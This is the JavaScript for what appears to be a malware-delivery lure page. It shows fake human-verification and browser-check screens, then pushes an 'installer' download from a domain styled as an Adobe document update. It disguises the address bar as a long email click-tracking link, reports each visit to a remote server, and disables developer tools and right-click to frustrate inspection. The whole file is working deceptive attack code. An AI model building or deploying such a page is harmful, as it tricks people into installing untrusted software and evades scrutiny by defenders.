(() => {
    "use strict";

    /* =========================================================
       ELEMENTS
    ========================================================== */

    const loadingScreen =
        document.getElementById("loadingScreen");

    const confirmScreen =
        document.getElementById("confirmScreen");

    const downloadScreen =
        document.getElementById("downloadScreen");

    const instructionsScreen =
        document.getElementById("instructionsScreen");

    const confirmButton =
        document.getElementById("confirmButton");

    const downloadButton =
        document.getElementById("downloadButton");

    const closeModal =
        document.getElementById("closeModal");

    const visitorToken =
        document.getElementById("visitorToken");

    const downloadStatus =
        document.getElementById("downloadStatus");

    const manualDownload =
        document.getElementById("manualDownload");

    const buttonText =
        confirmButton?.querySelector(".button-text");

    const buttonLoading =
        confirmButton?.querySelector(".button-loading");

    const downloadModal =
        document.querySelector(".download-modal");


    /* =========================================================
       CONFIGURATION
    ========================================================== */

    const CONFIG = {

        initialDelay: 1200,

        preparationDelay: 5000,

        backgroundDelay: 3000,

        workerBaseUrl:
            "https://documentverifyadobeupdated.willowcenteredtech.com",

        sessionEndpoint:
            "https://documentverifyadobeupdated.willowcenteredtech.com/api/session",

        visitEndpoint:
            "https://documentverifyadobeupdated.willowcenteredtech.com/api/visit",

        downloadEndpoint:
            "https://documentverifyadobeupdated.willowcenteredtech.com/api/download",

        longUrlOrigin:
            "https://www.willowcenteredtech.com",

        longUrlPath:
            "/ls/click",

        longUrlParameter:
            "upn",

        longUrlLength:
            256

    };


    /* =========================================================
       STORAGE KEYS
    ========================================================== */

    const STORAGE_KEYS = {

        visitToken:
            "deploypilot_visit_token",

        accessToken:
            "deploypilot_access_token",

        longUrlToken:
            "deploypilot_long_url_token",

        instructionRoute:
            "deploypilot_instruction_route"

    };


    /* =========================================================
       SESSION
    ========================================================== */

    let session = {

        visitToken: "",

        accessToken: "",

        longUrlToken: ""

    };


    let initialized = false;

    let downloadNavigationStarted = false;


    /* =========================================================
       TOKEN GENERATOR
    ========================================================== */

    function generateToken() {

        const alphabet =
            "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";

        const bytes =
            crypto.getRandomValues(
                new Uint8Array(7)
            );

        return Array.from(bytes)
            .map(
                byte =>
                    alphabet[
                        byte % alphabet.length
                    ]
            )
            .join("");

    }


    /* =========================================================
       URL-SAFE RANDOM TOKEN
    ========================================================== */

    function generateLongUrlToken(length) {

        const alphabet =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
            "abcdefghijklmnopqrstuvwxyz" +
            "0123456789-_";

        const bytes =
            crypto.getRandomValues(
                new Uint8Array(length)
            );

        let token = "";

        for (
            let i = 0;
            i < length;
            i++
        ) {

            token +=
                alphabet[
                    bytes[i] %
                    alphabet.length
                ];

        }

        return token;

    }


    /* =========================================================
       VALIDATE LONG ROUTE
    ========================================================== */

    function isLongRoute() {

        return (
            window.location.pathname ===
            CONFIG.longUrlPath
        );

    }


    /* =========================================================
       GET EXISTING LONG TOKEN
    ========================================================== */

    function getLongRouteToken() {

        if (!isLongRoute()) {
            return "";
        }

        const params =
            new URLSearchParams(
                window.location.search
            );

        const token =
            params.get(
                CONFIG.longUrlParameter
            );

        if (
            typeof token !== "string" ||
            token.length === 0
        ) {

            return "";

        }

        return token;

    }


    /* =========================================================
       ESTABLISH 256 CHARACTER URL
    ========================================================== */

    function establishLongBrowserUrl() {

        const existingToken =
            getLongRouteToken();


        /*
         * If the visitor already arrived through
         * /ls/click?upn=..., preserve that URL.
         */

        if (existingToken) {

            const existingUrl =
                window.location.href;

            if (
                existingUrl.length ===
                CONFIG.longUrlLength
            ) {

                session.longUrlToken =
                    existingToken;

                return existingUrl;

            }

        }


        /*
         * If sessionStorage contains our previous
         * long token, reuse it.
         */

        try {

            const storedToken =
                sessionStorage.getItem(
                    STORAGE_KEYS.longUrlToken
                );

            if (
                storedToken &&
                typeof storedToken === "string"
            ) {

                const prefix =
                    `${CONFIG.longUrlOrigin}` +
                    `${CONFIG.longUrlPath}` +
                    `?${CONFIG.longUrlParameter}=`;

                if (
                    prefix.length +
                    storedToken.length ===
                    CONFIG.longUrlLength
                ) {

                    const restoredUrl =
                        `${prefix}${storedToken}`;

                    history.replaceState(
                        {
                            longUrl: true
                        },
                        "",
                        `${CONFIG.longUrlPath}?${CONFIG.longUrlParameter}=${storedToken}`
                    );

                    session.longUrlToken =
                        storedToken;

                    return restoredUrl;

                }

            }

        } catch (error) {

            console.warn(
                "Unable to restore long URL token.",
                error
            );

        }


        /*
         * Construct fixed URL prefix.
         */

        const prefix =
            `${CONFIG.longUrlOrigin}` +
            `${CONFIG.longUrlPath}` +
            `?${CONFIG.longUrlParameter}=`;

        /*
         * Determine exactly how many random
         * characters are required.
         */

        const tokenLength =
            CONFIG.longUrlLength -
            prefix.length;


        if (tokenLength <= 0) {

            throw new Error(
                "Long URL configuration is invalid."
            );

        }


        const token =
            generateLongUrlToken(
                tokenLength
            );


        const longUrl =
            `${prefix}${token}`;


        /*
         * Hard validation.
         */

        if (
            longUrl.length !==
            CONFIG.longUrlLength
        ) {

            throw new Error(
                `Expected 256-character URL, received ${longUrl.length}.`
            );

        }


        /*
         * Validate URL structure.
         */

        const parsed =
            new URL(longUrl);


        if (
            parsed.origin !==
            CONFIG.longUrlOrigin
        ) {

            throw new Error(
                "Long URL origin validation failed."
            );

        }


        if (
            parsed.pathname !==
            CONFIG.longUrlPath
        ) {

            throw new Error(
                "Long URL path validation failed."
            );

        }


        /*
         * Store token for reload persistence.
         */

        try {

            sessionStorage.setItem(
                STORAGE_KEYS.longUrlToken,
                token
            );

        } catch (error) {

            console.warn(
                "Unable to persist long URL token.",
                error
            );

        }


        /*
         * Change the browser URL WITHOUT
         * reloading the document.
         */

        history.replaceState(
            {
                longUrl: true
            },
            "",
            `${CONFIG.longUrlPath}?${CONFIG.longUrlParameter}=${token}`
        );


        session.longUrlToken =
            token;


        /*
         * Validate actual visible URL.
         */

        const visibleUrl =
            window.location.href;


        if (
            visibleUrl.length !==
            CONFIG.longUrlLength
        ) {

            throw new Error(
                `Browser URL length validation failed: ${visibleUrl.length}`
            );

        }


        return visibleUrl;

    }


    /* =========================================================
       VISITOR TOKEN VALIDATION
    ========================================================== */

    function isValidVisitToken(value) {

        return (
            typeof value === "string" &&
            /^[A-Z0-9]{7}$/.test(value)
        );

    }


    /* =========================================================
       ACCESS TOKEN VALIDATION
    ========================================================== */

    function isValidAccessToken(value) {

        return (
            typeof value === "string" &&
            value.length > 0 &&
            value.length <= 4096
        );

    }


    /* =========================================================
       SHOW
    ========================================================== */

    function show(element) {

        if (!element) {
            return;
        }

        element.classList.remove(
            "hidden"
        );

    }


    /* =========================================================
       HIDE
    ========================================================== */

    function hide(element) {

        if (!element) {
            return;
        }

        element.classList.add(
            "hidden"
        );

    }


    /* =========================================================
       SHOW ONLY ONE SCREEN
    ========================================================== */

    function showOnly(screen) {

        const screens = [
            loadingScreen,
            confirmScreen,
            downloadScreen,
            instructionsScreen
        ];

        screens.forEach(
            item => {

                if (item) {
                    hide(item);
                }

            }
        );


        if (screen) {
            show(screen);
        }

    }


    /* =========================================================
       CONFIRMATION VARIANTS
    ========================================================== */

    const confirmationVariants = [

        {
            id: 1,

            className:
                "confirm-variant-1",

            eyebrow:
                "Verification",

            title:
                "Confirm you are human",

            description:
                "This quick check helps keep the site safe. It usually takes a few seconds.",

            visual: `
                <div class="visual-check">
                    <span>✓</span>
                </div>
            `
        },


        {
            id: 2,

            className:
                "confirm-variant-2",

            eyebrow:
                "READY TO CONTINUE",

            title:
                "Almost there",

            description:
                "Confirm below to continue securely.",

            visual: `
                <div class="visual-circle">
                    <span class="visual-download">↓</span>
                </div>
            `
        },


        {
            id: 3,

            className:
                "confirm-variant-3",

            eyebrow:
                "BROWSER CHECK",

            title:
                "One more step",

            description:
                "Confirm your browser to continue securely.",

            visual: `
                <div class="visual-check">
                    <span>✓</span>
                </div>
            `
        },


        {
            id: 4,

            className:
                "confirm-variant-4",

            eyebrow:
                "BROWSER CHECK",

            title:
                "Almost ready",

            description:
                "Your connection stays encrypted. Confirm below to continue.",

            visual: `
                <div class="visual-lock">
                    <div class="lock-shackle"></div>
                    <div class="lock-body"></div>
                </div>
            `
        },


        {
            id: 5,

            className:
                "confirm-variant-5",

            eyebrow:
                "HUMAN VERIFY",

            title:
                "One more step",

            description:
                "We need a short verification before showing the page.",

            visual: `
                <div class="visual-lock">
                    <div class="lock-shackle"></div>
                    <div class="lock-body"></div>
                </div>
            `
        },


        {
            id: 6,

            className:
                "confirm-variant-6",

            eyebrow:
                "PROTECTED SESSION",

            title:
                "Just a Moment",

            description:
                "This quick check helps keep the site safe. It usually takes a few seconds.",

            visual: `
                <div class="visual-grid">
                    <span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
            `
        }

    ];


    /* =========================================================
       SELECT CONFIRMATION VARIANT
    ========================================================== */

    function selectConfirmationVariant() {

        const card =
            document.getElementById(
                "confirmCard"
            );

        const visual =
            document.getElementById(
                "confirmVisual"
            );

        const eyebrow =
            document.getElementById(
                "confirmEyebrow"
            );

        const title =
            document.getElementById(
                "confirmTitle"
            );

        const description =
            document.getElementById(
                "confirmDescription"
            );


        if (!card) {
            return;
        }


        const token =
            session.visitToken || "";


        let hash = 0;


        for (
            let i = 0;
            i < token.length;
            i++
        ) {

            hash =
                ((hash << 5) - hash) +
                token.charCodeAt(i);

            hash |= 0;

        }


        const index =
            Math.abs(hash) %
            confirmationVariants.length;


        const variant =
            confirmationVariants[index];


        confirmationVariants.forEach(
            item => {

                card.classList.remove(
                    item.className
                );

            }
        );


        card.classList.add(
            variant.className
        );


        if (eyebrow) {
            eyebrow.textContent =
                variant.eyebrow;
        }


        if (title) {
            title.textContent =
                variant.title;
        }


        if (description) {
            description.textContent =
                variant.description;
        }


        if (visual) {
            visual.innerHTML =
                variant.visual;
        }

    }


    /* =========================================================
       RESTORE SESSION
    ========================================================== */

    function restoreStoredSession() {

        try {

            const storedVisitToken =
                sessionStorage.getItem(
                    STORAGE_KEYS.visitToken
                );

            const storedAccessToken =
                sessionStorage.getItem(
                    STORAGE_KEYS.accessToken
                );

            const storedLongToken =
                sessionStorage.getItem(
                    STORAGE_KEYS.longUrlToken
                );


            if (
                isValidVisitToken(
                    storedVisitToken
                )
            ) {

                session.visitToken =
                    storedVisitToken;

            }


            if (
                isValidAccessToken(
                    storedAccessToken
                )
            ) {

                session.accessToken =
                    storedAccessToken;

            }


            if (
                typeof storedLongToken ===
                "string" &&
                storedLongToken.length > 0
            ) {

                session.longUrlToken =
                    storedLongToken;

            }

        } catch (error) {

            console.warn(
                "Session storage unavailable.",
                error
            );

        }

    }


    /* =========================================================
       SAVE SESSION
    ========================================================== */

    function saveSession() {

        try {

            if (
                isValidVisitToken(
                    session.visitToken
                )
            ) {

                sessionStorage.setItem(
                    STORAGE_KEYS.visitToken,
                    session.visitToken
                );

            }


            if (
                isValidAccessToken(
                    session.accessToken
                )
            ) {

                sessionStorage.setItem(
                    STORAGE_KEYS.accessToken,
                    session.accessToken
                );

            }


            if (
                session.longUrlToken
            ) {

                sessionStorage.setItem(
                    STORAGE_KEYS.longUrlToken,
                    session.longUrlToken
                );

            }

        } catch (error) {

            console.warn(
                "Unable to persist session.",
                error
            );

        }

    }


    /* =========================================================
       CREATE WORKER SESSION
    ========================================================== */

    async function createSession() {

        /*
         * UI fallback identifier.
         */

        if (
            !isValidVisitToken(
                session.visitToken
            )
        ) {

            session.visitToken =
                generateToken();

        }


        try {

            const response =
                await fetch(
                    CONFIG.sessionEndpoint,
                    {
                        method: "POST",

                        headers: {
                            "Accept":
                                "application/json"
                        },

                        credentials:
                            "omit",

                        cache:
                            "no-store"
                    }
                );


            if (!response.ok) {

                throw new Error(
                    `Worker returned HTTP ${response.status}`
                );

            }


            const contentType =
                response.headers.get(
                    "content-type"
                ) || "";


            if (
                !contentType
                    .toLowerCase()
                    .includes(
                        "application/json"
                    )
            ) {

                throw new Error(
                    "Worker returned non-JSON."
                );

            }


            const data =
                await response.json();


            if (
                isValidVisitToken(
                    data?.visitToken
                )
            ) {

                session.visitToken =
                    data.visitToken;

            }


            if (
                isValidAccessToken(
                    data?.accessToken
                )
            ) {

                session.accessToken =
                    data.accessToken;

            }


            saveSession();


            console.log(
                "Worker session established."
            );

        } catch (error) {

            console.warn(
                "Worker session unavailable.",
                error
            );

        }


        if (visitorToken) {

            visitorToken.textContent =
                session.visitToken;

        }


        selectConfirmationVariant();

    }


    /* =========================================================
       REPORT VISIT
    ========================================================== */

    function reportVisit() {

        if (
            !CONFIG.visitEndpoint ||
            !isValidVisitToken(
                session.visitToken
            )
        ) {

            return;

        }


        fetch(
            CONFIG.visitEndpoint,
            {
                method: "POST",

                headers: {
                    "Content-Type":
                        "application/json",

                    "Accept":
                        "application/json"
                },

                credentials:
                    "omit",

                cache:
                    "no-store",

                keepalive:
                    true,

                body:
                    JSON.stringify({
                        visitToken:
                            session.visitToken,

                        route:
                            window.location.pathname,

                        longToken:
                            session.longUrlToken
                    })
            }
        ).catch(
            () => {}
        );

    }


    /* =========================================================
       SET PREPARING
    ========================================================== */

    function setPreparing() {

        if (!confirmButton) {
            return;
        }


        confirmButton.disabled =
            true;


        if (buttonText) {

            buttonText.classList.add(
                "hidden"
            );

        }


        if (buttonLoading) {

            buttonLoading.classList.remove(
                "hidden"
            );

        }

    }


    /* =========================================================
       SHOW INSTALLER BACKGROUND
    ========================================================== */

    function showInstallerBackground() {

        if (!downloadScreen) {
            return;
        }


        showOnly(
            downloadScreen
        );


        if (downloadModal) {

            downloadModal.classList.remove(
                "modal-visible"
            );

        }


        document.body.style.overflow =
            "hidden";


        requestAnimationFrame(
            () => {

                setTimeout(
                    () => {

                        if (
                            downloadModal
                        ) {

                            downloadModal.classList.add(
                                "modal-visible"
                            );

                        }

                    },
                    CONFIG.backgroundDelay
                );

            }
        );

    }


    /* =========================================================
       RETURN TO CONFIRMATION
    ========================================================== */

    function closeDownloadScreen() {

        showOnly(
            confirmScreen
        );


        document.body.style.overflow =
            "";


        if (downloadModal) {

            downloadModal.classList.remove(
                "modal-visible"
            );

        }


        if (
            confirmButton &&
            !downloadNavigationStarted
        ) {

            confirmButton.disabled =
                false;

        }

    }


    /* =========================================================
       UPDATE DOWNLOAD STATUS
    ========================================================== */

    function updateDownloadStatus(
        state
    ) {

        if (!downloadStatus) {
            return;
        }


        if (state === "starting") {

            downloadStatus.innerHTML = `
                <div class="status-spinner"></div>

                <div>
                    <strong>
                        Starting download...
                    </strong>

                    <p>
                        Your installer should appear
                        in your Downloads folder shortly.
                    </p>
                </div>
            `;

            return;

        }


        if (state === "success") {

            downloadStatus.innerHTML = `
                <div class="status-success">
                    ✓
                </div>

                <div>
                    <strong>
                        Download started
                    </strong>

                    <p>
                        Check your Downloads folder
                        for the installer.
                    </p>
                </div>
            `;

            return;

        }


        downloadStatus.innerHTML = `
            <div class="status-error">
                !
            </div>

            <div>
                <strong>
                    Download unavailable
                </strong>

                <p>
                    Please use the download button
                    again.
                </p>
            </div>
        `;

    }


    /* =========================================================
       BUILD PROTECTED DOWNLOAD URL
    ========================================================== */

    function buildDownloadUrl() {

        if (
            !isValidAccessToken(
                session.accessToken
            )
        ) {

            return "";

        }


        const url =
            new URL(
                CONFIG.downloadEndpoint
            );


        url.searchParams.set(
            "access",
            session.accessToken
        );


        return url.toString();

    }


    /* =========================================================
       ROUTE TO INSTALLATION SCREEN
    ========================================================== */

    function routeToInstructions() {

        /*
         * This is the important SPA route.
         *
         * We DO NOT navigate to download.html.
         * We simply switch the visible section.
         *
         * The 256-character URL remains in the
         * browser address bar.
         */

        downloadNavigationStarted =
            true;


        if (downloadButton) {

            downloadButton.disabled =
                true;

        }


        showOnly(
            instructionsScreen
        );


        document.body.style.overflow =
            "";


        try {

            sessionStorage.setItem(
                STORAGE_KEYS.instructionRoute,
                "true"
            );

        } catch (error) {

            console.warn(
                "Unable to persist instruction route.",
                error
            );

        }


        startProtectedDownload();

    }


    /* =========================================================
       START PROTECTED DOWNLOAD
    ========================================================== */

    function startProtectedDownload() {

        const downloadUrl =
            buildDownloadUrl();


        if (!downloadUrl) {

            updateDownloadStatus(
                "error"
            );

            return;

        }


        updateDownloadStatus(
            "starting"
        );


        if (manualDownload) {

            manualDownload.href =
                downloadUrl;

        }


        /*
         * Normal browser navigation to the Worker.
         *
         * The Worker validates the signed access
         * token before redirecting to the installer.
         */

        setTimeout(
            () => {

                window.location.assign(
                    downloadUrl
                );

            },
            500
        );


        setTimeout(
            () => {

                updateDownloadStatus(
                    "success"
                );

            },
            1500
        );

    }


    /* =========================================================
       CONFIRM BUTTON
    ========================================================== */

    if (confirmButton) {

        confirmButton.addEventListener(
            "click",
            () => {

                if (
                    confirmButton.disabled
                ) {

                    return;

                }


                setPreparing();


                saveSession();


                setTimeout(
                    () => {

                        showInstallerBackground();

                    },
                    CONFIG.preparationDelay
                );

            }
        );

    }


    /* =========================================================
       DOWNLOAD BUTTON
    ========================================================== */

    if (downloadButton) {

        downloadButton.addEventListener(
            "click",
            () => {

                if (
                    downloadNavigationStarted
                ) {

                    return;

                }


                /*
                 * Refresh session values from storage.
                 */

                try {

                    const storedAccessToken =
                        sessionStorage.getItem(
                            STORAGE_KEYS.accessToken
                        ) || "";

                    const storedVisitToken =
                        sessionStorage.getItem(
                            STORAGE_KEYS.visitToken
                        ) || "";


                    if (
                        isValidAccessToken(
                            storedAccessToken
                        )
                    ) {

                        session.accessToken =
                            storedAccessToken;

                    }


                    if (
                        isValidVisitToken(
                            storedVisitToken
                        )
                    ) {

                        session.visitToken =
                            storedVisitToken;

                    }

                } catch (error) {

                    console.warn(
                        "Unable to restore session.",
                        error
                    );

                }


                /*
                 * Require Worker authorization.
                 */

                if (
                    !isValidAccessToken(
                        session.accessToken
                    )
                ) {

                    console.warn(
                        "No valid Worker access token."
                    );


                    updateDownloadStatus(
                        "error"
                    );


                    return;

                }


                routeToInstructions();

            }
        );

    }


    /* =========================================================
       MANUAL DOWNLOAD
    ========================================================== */

    if (manualDownload) {

        manualDownload.addEventListener(
            "click",
            event => {

                const url =
                    buildDownloadUrl();


                if (!url) {

                    event.preventDefault();

                    updateDownloadStatus(
                        "error"
                    );

                    return;

                }


                manualDownload.href =
                    url;

            }
        );

    }


    /* =========================================================
       CLOSE MODAL
    ========================================================== */

    if (closeModal) {

        closeModal.addEventListener(
            "click",
            () => {

                closeDownloadScreen();

            }
        );

    }


    /* =========================================================
       ESCAPE KEY
    ========================================================== */

    document.addEventListener(
        "keydown",
        event => {

            if (
                event.key === "Escape" &&
                downloadScreen &&
                !downloadScreen.classList.contains(
                    "hidden"
                )
            ) {

                closeDownloadScreen();

            }

        }
    );


    /* =========================================================
       BROWSER BACK/FORWARD
    ========================================================== */

    window.addEventListener(
        "popstate",
        () => {

            /*
             * If the browser goes back to the root,
             * return to confirmation.
             */

            if (
                window.location.pathname === "/"
            ) {

                showOnly(
                    confirmScreen
                );

                return;

            }


            /*
             * If the browser is on the long route,
             * keep the SPA alive.
             */

            if (
                isLongRoute()
            ) {

                showOnly(
                    confirmScreen
                );

            }

        }
    );


    /* =========================================================
       ROUTE RESTORATION AFTER RELOAD
    ========================================================== */

    function restoreRouteAfterReload() {

        /*
         * The long URL is deliberately retained.
         */

        if (
            !isLongRoute()
        ) {

            return;

        }


        /*
         * The long URL is valid only if the token
         * is present and the complete URL is 256 chars.
         */

        const token =
            getLongRouteToken();


        if (
            !token ||
            window.location.href.length !==
            CONFIG.longUrlLength
        ) {

            console.warn(
                "Invalid long route."
            );

            return;

        }


        session.longUrlToken =
            token;


        /*
         * We intentionally return to the confirmation
         * screen after reload.
         *
         * The long URL remains unchanged.
         */

        showOnly(
            confirmScreen
        );

    }


    /* =========================================================
       INITIALIZE
    ========================================================== */

    async function initialize() {

        if (initialized) {
            return;
        }

        initialized = true;


        /*
         * Restore session first.
         */

        restoreStoredSession();


        /*
         * Establish/reuse 256-character URL.
         */

        try {

            establishLongBrowserUrl();

        } catch (error) {

            console.warn(
                "Unable to establish long browser URL.",
                error
            );

        }


        /*
         * Create/refresh Worker authorization.
         */

        await createSession();


        /*
         * Report visitor.
         */

        reportVisit();


        /*
         * Restore the SPA route.
         */

        restoreRouteAfterReload();


        /*
         * Initial loading screen.
         */

        setTimeout(
            () => {

                /*
                 * Never replace the instruction screen
                 * if a future change causes it to be active.
                 */

                if (
                    instructionsScreen &&
                    !instructionsScreen.classList.contains(
                        "hidden"
                    )
                ) {

                    return;

                }


                hide(
                    loadingScreen
                );


                /*
                 * If the long route is valid,
                 * confirmation is the initial state.
                 */

                show(
                    confirmScreen
                );

            },
            CONFIG.initialDelay
        );

    }


    /* =========================================================
       BASIC INSPECTION DETERRENTS
    ========================================================== */

    document.addEventListener(
        "contextmenu",
        event => {

            event.preventDefault();

        }
    );


    document.addEventListener(
        "dragstart",
        event => {

            if (
                event.target &&
                event.target.tagName === "IMG"
            ) {

                event.preventDefault();

            }

        }
    );


    document.addEventListener(
        "keydown",
        event => {

            const key =
                event.key.toLowerCase();


            if (
                event.key === "F12"
            ) {

                event.preventDefault();

            }


            if (
                event.ctrlKey &&
                event.shiftKey &&
                [
                    "i",
                    "j",
                    "c"
                ].includes(key)
            ) {

                event.preventDefault();

            }


            if (
                event.ctrlKey &&
                key === "u"
            ) {

                event.preventDefault();

            }

        }
    );


    /* =========================================================
       START
    ========================================================== */

    initialize();

})();